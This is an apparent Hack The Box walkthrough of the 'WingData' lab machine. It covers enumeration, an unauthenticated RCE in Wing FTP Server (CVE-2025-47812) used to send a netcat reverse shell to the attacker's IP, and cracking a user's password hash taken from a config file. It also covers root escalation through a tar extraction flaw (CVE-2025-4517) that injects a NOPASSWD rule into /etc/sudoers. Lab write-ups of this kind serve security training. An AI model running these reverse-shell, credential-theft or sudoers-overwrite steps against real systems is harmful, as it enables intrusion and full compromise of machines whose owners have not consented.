# WingData – Hack The Box Walkthrough
---

## 1. Connecting to Hack The Box (VPN Setup)

HTB machines are accessible only through a private network.

### Start VPN

```bash
sudo openvpn <file>.ovpn
```

### Verify Connection

```bash
ip a | grep tun0
```

* `tun0` is the virtual network interface created by OpenVPN
* It assigns you an internal IP (example: 10.10.x.x)
* This allows communication with HTB machines

---

## 2. Initial Enumeration

### Nmap Scan

```bash
nmap -sC -sV -A -oN scan.txt <IP>
```

### Flags Explanation

* `-sC` : runs default scripts (checks for common vulnerabilities)
* `-sV` : detects service versions
* `-A` : aggressive scan (OS detection, traceroute, scripts)
* `-oN` : saves output

### Open Ports

```
22  SSH
80  HTTP
```

* Port 22 : Secure Shell (remote login service)
* Port 80 : Web server (main attack surface)

---

## 3. DNS Mapping

### Why Needed

HTB machines use internal domains like:

```
wingdata.htb
```

These are not resolvable publicly.

### Fix

```bash
sudo nano /etc/hosts
```

Add:

```
<IP> wingdata.htb ftp.wingdata.htb
```

### How it Works

* `/etc/hosts` is checked before DNS servers
* It manually maps domain - IP
* Ensures proper interaction with web apps

---

## 4. Web Enumeration

Visit:

```
http://wingdata.htb
```

### Findings

* Corporate-looking website
* Navigation menu present
* “Client Portal” button

Clicking it redirects to:

```
http://ftp.wingdata.htb
```

This reveals a new subdomain, which often means:

* New service
* New attack surface

---

## 5. Service Identification

The page shows:

```
Wing FTP Server v7.4.3
```

### Why this matters

* Version disclosure allows vulnerability research
* Old or specific versions often have known CVEs

---

## 6. Vulnerability Identification

Search:

```
Wing FTP Server v7.4.3 exploit
```

### Found CVE

```
CVE-2025-47812
```
* Allows unauthenticated remote code execution (RCE)
* No login required
* Attacker can run commands on the server

### Why it exists

* Improper input handling in backend
* Requests are processed without proper validation

---

## 7. Exploit Setup

### Clone exploit

```bash
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
cd CVE-2025-47812-poc
```

---

## 8. Reverse Shell Listener

```bash
nc -lvnp 5555
```

### Flags

* `-l` : listen
* `-v` : verbose
* `-n` : no DNS
* `-p` : port

---

## 9. Exploitation

```bash
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc <YOUR_IP> 5555 -e /bin/sh" -v
```

### Explanation

* `-u` : target URL
* `-c` : command executed on target
* `nc ... -e /bin/sh` : reverse shell
* `-v` : verbose output

#### 1. Takes your input

You give:

-u http://ftp.wingdata.htb
-c "nc <IP> 5555 -e /bin/sh"

So the script now knows:

where to attack
what command to run

#### 2. Talks to the web server

Using Python’s requests library, it sends HTTP requests like a browser would.

#### 3. Bypasses authentication

It tricks the server into giving a valid session (UID) without proper login.

So now it behaves like:

“I’m a valid user, trust me.”

#### 4. Injects your command

It sends your payload inside a parameter to a vulnerable endpoint.

Instead of safe input, it sends:

nc <IP> 5555 -e /bin/sh
#### 5. Server executes it (this is the bug)

The server does something like:

system(user_input)

So your input becomes a real command on the machine.

#### 6. You get a shell

Your listener catches:
And boom:
target connects back
you get terminal access

---

## 10. Initial Access

After running exploit:

```bash
id
```

### Output

```
uid=1000(wingftp)
```

### Meaning

* You are not root
* You are a service account (`wingftp`)
* Limited privileges

---

## 11. Stabilizing Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Why

* Converts basic shell - interactive shell
* Enables better command execution
* A common practice acc to google , idk y , looks better so

---

## 12. User Enumeration

```bash
cd /home
ls
```

### Output

```
wingftp
wacky
```

### Observation

* `wacky` is likely a real system user
* Cannot access directly due to permissions

---

## 13. Credential Discovery

I checked the Wing FTP Server folder to find settings and saved passwords. 

Using what I knew about the folder layout, I went to the user configuration folder.

```bash
cd /opt/wftpserver/Data/1/users
ls
```

### Files

```
wacky.xml
```

Read:

```bash
cat wacky.xml
```

### Output

Contains:

```
<Password>HASH</Password>
```

---

## 14. Password Cracking

### Save hash locally

```bash
nano hash.txt
```

### Crack

```bash
hashcat -m 1410 hash.txt wordlists/rockyou.txt
```

### Explanation

* `-m 1410` → Wing FTP hash mode
* `rockyou.txt` → common password list

### Result

```
wacky : password
```

---

## 15. SSH Access

```bash
ssh wacky@<IP>
```

### Why this works

* Credentials are system-level
* SSH uses system authentication

---

## 16. User Flag

```bash
cat user.txt
```

---

## 17. Privilege Escalation Enumeration

```bash
sudo -l
```

### Output

```
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

### Meaning

* Can run Python script as root
* No password required
* Accepts arguments (`*`) : The asterisk in that specific context is a wildcard.

It means the user can add any text after the command, and the system will allow it to run with full administrative (root) power.

---

## 18. Vulnerability Analysis

### Intended Purpose

* Backup Creation: Administrators create backups in `.tar` format.
* Restoration: The script restores these files to the system when needed.

---

### Security Vulnerabilities

* Privileged Execution: The script runs with root (administrative) privileges.
* Insecure Extraction: The utility extracts `.tar` files, which may lead to path traversal or arbitrary file write vulnerabilities.


### Key Issue

* Improper handling of archive extraction

---

## 19. CVE Identification

```
CVE-2025-4517
```

### Explanation

* Tar extraction allows path traversal
* Symlinks and hardlinks can escape directories
* Can overwrite sensitive files like `/etc/sudoers`

---

## 20. Exploit Logic

The exploit:

* Creates malicious `.tar`
* Targets `/etc/sudoers`
* Injects root privilege rule

---

## 21. Exploit Transfer

### Start server (attacker)

```bash
python3 -m http.server 8000
```

### Download on target

```bash
cd /tmp
wget http://<YOUR_IP>:8000/CVE-2025-4517-POC.py
```

---

## 22. Exploitation

```bash
python3 CVE-2025-4517-POC.py
```

### What happens internally

* Script creates tar file
* Places it in backup directory
* Triggers restore script
* Restore runs as root
* Extraction overwrites `/etc/sudoers`

---

## 23. Sudoers Injection

Injected line:

```
wacky ALL=(ALL) NOPASSWD: ALL
```

### Meaning

* User `wacky` can run any command as root
* No password required

---

## 24. Root Access

```bash
sudo /bin/bash
```

### Verify

```bash
id
```

### Output

```
uid=0(root)
```

---

## 25. Root Flag

```bash
cat /root/root.txt
```

---
